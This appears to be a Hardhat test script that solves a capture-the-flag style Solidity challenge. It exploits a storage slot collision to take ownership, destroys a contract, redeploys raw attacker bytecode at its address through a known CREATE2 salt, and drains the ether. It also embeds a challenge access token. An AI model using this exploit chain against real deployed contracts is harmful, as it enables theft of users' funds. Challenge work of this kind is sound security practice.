import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("SolidityTutor", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    // Set the challenge instance to the address returned when deploying the challenge.
    let challenge_instance_address = "0xc549BAA2E2fBB2D40c9e79533A04003226C2582f";
    let token = "v4.local.b9hZXrcxYa0UZU-rld2JU9XCM3OKcMHTSLD10IcOqDkZyymwUmMODW5zgPtzwHktGJqLFi90Kua1MeZYs5VrCaFit8akPU05zRC4zYliva4NX5e8qdGyMJhdzr7jjY_9HYoRTZS0TSsfF9ZSaDSmBARyDpPDUP9okgYDoUVwliqIlw"

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);

        // comment the next two lines if running locally 
        challengeFactory = await ethers.getContractFactory("SolidityTutor");
        challenge = challengeFactory.attach(challenge_instance_address);

        // uncomment if running locally:
        // challengeFactory = await ethers.getContractFactory("SolidityTutor");
        // challenge = await challengeFactory.deploy() /**put your constructor args here*/;
        // await challenge.deployed();
    });

    it("Should solve the challenge", async () => {
        const currentOwner = await challenge.owner();
        try {
            const resetTx = await challenge.resetToInitialTutorial(
                { value: ethers.utils.parseEther("0.001"), gasLimit: 5000000 }
            );
            const resetReceipt = await resetTx.wait();
            console.log("Tutorial reset complete, now attacking storage slot clash vulnerability to change owner:");
        } catch (e) {
            console.log(e);
            console.error("Error during challenge.resetToInitialTutorial()");
            process.exit();
        }
        
        const currentTutorialContract = await challenge.currentTutorialContract();
        console.log("Current tutor owner: ", currentOwner);
        console.log("Current tutorial contract", currentTutorialContract);

        // Deploying helper contract:
        const helperFactory = await ethers.getContractFactory("SolidityTutorHelper");
        const helper = await helperFactory.deploy();
        await helper.deployed();
        
        console.log("Helper contract deployed at:", helper.address);

        // Attacking storage slot collision vulnerability:
        try {
            const changeOwnerTx = await helper.changeOwner(player, challenge.address, { gasLimit: 500000 });
            const changeOwnerReceipt = await changeOwnerTx.wait();
            const owner = await challenge.owner();
            console.log("New owner is player?", owner == player);
            console.log("Proceeding to deletion of initial contract through GoodByeWorld()");
        } catch (e) {
            console.log("Error during changeOwner()");
            process.exit();
        }

        try { 
            const goodbyeWorldTx = await helper.killTutorial(currentTutorialContract, { gasLimit: 500000 });
            const goodbyeWorldReceipt = await goodbyeWorldTx.wait();
            console.log("GoodbyeWorld succeeded, now attempting to override tutorial contract");
        } catch (e) {
            console.log("Error during GoodByeWorldTx");
            process.exit();
        }

        const salt = 133742069; // This can be found by debugging the resetToInitialTutorial() transaction.

        const attacker_bytecode = "0x608060405234801561001057600080fd5b5061027f806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806353ce9e391461003b578063d018db3e14610059575b600080fd5b610043610089565b6040516100509190610122565b60405180910390f35b610073600480360381019061006e91906101a0565b610093565b60405161008091906101e8565b60405180910390f35b6000610539905090565b6000808273ffffffffffffffffffffffffffffffffffffffff16476040516100ba90610234565b60006040518083038185875af1925050503d80600081146100f7576040519150601f19603f3d011682016040523d82523d6000602084013e6100fc565b606091505b5050905080915050919050565b6000819050919050565b61011c81610109565b82525050565b60006020820190506101376000830184610113565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061016d82610142565b9050919050565b61017d81610162565b811461018857600080fd5b50565b60008135905061019a81610174565b92915050565b6000602082840312156101b6576101b561013d565b5b60006101c48482850161018b565b91505092915050565b60008115159050919050565b6101e2816101cd565b82525050565b60006020820190506101fd60008301846101d9565b92915050565b600081905092915050565b50565b600061021e600083610203565b91506102298261020e565b600082019050919050565b600061023f82610211565b915081905091905056fea2646970667358221220bf5925e5ca1154ebba281a3a1fa508e3fee2835c2324c606bccf56bfee67a27264736f6c634300080d0033";

        try { 
            const changeTutorialTx = await challenge.changeTutorial(salt, attacker_bytecode, 
                { gasLimit: 5000000 }
            );
            const changeTutorialReceipt = await changeTutorialTx.wait();
            console.log("Tutorial changed, now attempting final attack to steal ether");
        } catch (e) {
            console.log("Error at changeTutorialTx");
            process.exit();
        }

        const attackerFactory = await ethers.getContractFactory("SolidityTutorAttacker");
        const attacker = attackerFactory.attach(currentTutorialContract);
        const sanity = await attacker.sanity();
        console.log(sanity);

        try { 
            const attackTx = await helper.attack(player, challenge.address);
            const attackReceipt = await attackTx.wait();
            console.log("Attack complete, now checking if solved...");
        } catch (e) {
            console.error("Error at helper.attack()");
            process.exit();
        }
        
        const balance = await ethers.provider.getBalance(challenge.address);
        const code = await ethers.provider.getCode(currentTutorialContract);
        console.log("Code matches attacker:", code == attacker_bytecode);
        console.log("address balance:", ethers.utils.formatEther(balance));
        const solved = await challenge.isSolved();
        console.log("Solved?", solved);
        expect(solved).to.be.true;
    });
});